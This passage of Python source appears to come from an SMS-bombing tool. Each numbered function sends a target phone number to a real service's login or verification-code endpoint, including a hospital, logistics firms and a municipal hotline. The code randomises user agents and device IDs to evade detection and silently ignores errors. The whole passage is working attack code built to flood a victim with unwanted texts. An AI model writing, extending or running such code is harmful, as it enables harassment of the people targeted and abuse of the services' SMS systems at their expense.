            {"id": "Device-005", "ua": "Mozilla/5.0 (iPad; CPU OS 18_5 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 MicroMessenger/8.0.63 NetType/WIFI", "vid": "5YfziwWel14kIgWnYm58u"}
        ]
        device = random.choice(devices)
        
        url = "https://api.3sd.cn/sms/send"
        headers = {
            "Host": "api.3sd.cn",
            "Accept": "application/json",
            "Sec-Fetch-Site": "same-site",
            "Accept-Language": "zh-CN,zh-Hans;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Sec-Fetch-Mode": "cors",
            "Content-Type": "application/json",
            "Origin": "https://m.3sd.cn",
            "User-Agent": device["ua"],
            "Referer": "https://m.3sd.cn/",
            "Connection": "keep-alive",
            "Sec-Fetch-Dest": "empty",
            "Cookie": f"vid={device['vid']}"
        }
        data = json.dumps({"username": phone, "type": "LOGIN", "voice": True})
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_96(phone):
    """hosian短信接口"""
    try:
        # 随机设备类型
        sys_type = random.choice(['ios', 'android', 'windows'])
        if sys_type == 'ios':
            ua = "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Html5Plus/1.0 (Immersed/44) uni-app"
        elif sys_type == 'android':
            ua = "Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36 Html5Plus/1.0 uni-app"
        else:
            ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Html5Plus/1.0 uni-app"
        
        url = "https://game.hosian.com/api/sms"
        headers = {
            "Host": "game.hosian.com",
            "Accept": "*/*",
            "Authorization": "",
            "clientId": "",
            "locale": "zh",
            "Accept-Language": "zh-CN,zh-Hans;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Content-Type": "application/json",
            "tenantId": "0",
            "lang": "zh_CN",
            "Connection": "keep-alive",
            "sign": "267670e6d840493d6a252e44bc86805bb3a8aab0740c436a5e600c557f197fdb",
            "User-Agent": ua
        }
        data = json.dumps({"phone": phone})
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_97(phone):
    """贝腾VIP服务"""
    try:
        url = "https://vipapi.beteng.com/VIP/DoSendByCellPhone"
        headers = {
            "Host": "vipapi.beteng.com",
            "Content-Type": "application/json",
            "User-Agent": generate_random_user_agent()
        }
        data = json.dumps({"ID": 0, "Cellphone": phone})
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_98(phone):
    """企联物流验证"""
    try:
        url = "http://scm.qlx56.com/gateway/scm-basic/v1/msgRecord/sendAuthCode"
        headers = {
            "Host": "scm.qlx56.com",
            "Content-Type": "application/json; charset=UTF-8",
            "User-Agent": generate_random_user_agent()
        }
        data = json.dumps({"mobile": phone, "tenantCode": "60087", "openId": "oapZHs4qwfJJEXDIrFhnx62bPDiY"})
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_99(phone):
    """信安服务"""
    try:
        url = "https://passport.xag.cn/home/sms_code"
        headers = {
            "Host": "passport.xag.cn",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": generate_random_user_agent()
        }
        data = f"icc=86&phone={phone}"
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_100(phone):
    """快仓物流"""
    try:
        url = "https://api.kucee.com/website.Access/getPhoneCode"
        headers = {
            "Host": "api.kucee.com",
            "Content-Type": "application/json",
            "User-Agent": generate_random_user_agent()
        }
        data = json.dumps({"phone": phone, "type": "1", "storeId": "0"})
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_101(phone):
    """医疗服务验证"""
    try:
        url = "https://hospital.fjlyrmyy.com/ihp-gateway/api/cms/sendCode"
        headers = {
            "Host": "hospital.fjlyrmyy.com",
            "Content-Type": "application/json",
            "User-Agent": generate_random_user_agent()
        }
        data = json.dumps({
            "transType": "",
            "param": {
                "phone": phone,
                "codeType": "LOGIN"
            }
        })
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_102(phone):
    """中联服务"""
    try:
        url = "https://sso.zlgx.com/api/v2/sms/sendVerificationCode"
        headers = {
            "Host": "sso.zlgx.com",
            "Content-Type": "application/json; charset=utf-8",
            "User-Agent": generate_random_user_agent()
        }
        data = json.dumps({
            "params": {
                "phone": phone,
                "platfromCode": "fpop"
            }
        })
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_103(phone):
    """泰安12345"""
    try:
        url = "https://12345.wx.taian.cn/api/wechat.php"
        headers = {
            "Host": "12345.wx.taian.cn",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": generate_random_user_agent()
        }
        data = f"act=ms_vel_code&src_type=1&phone={phone}"
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass
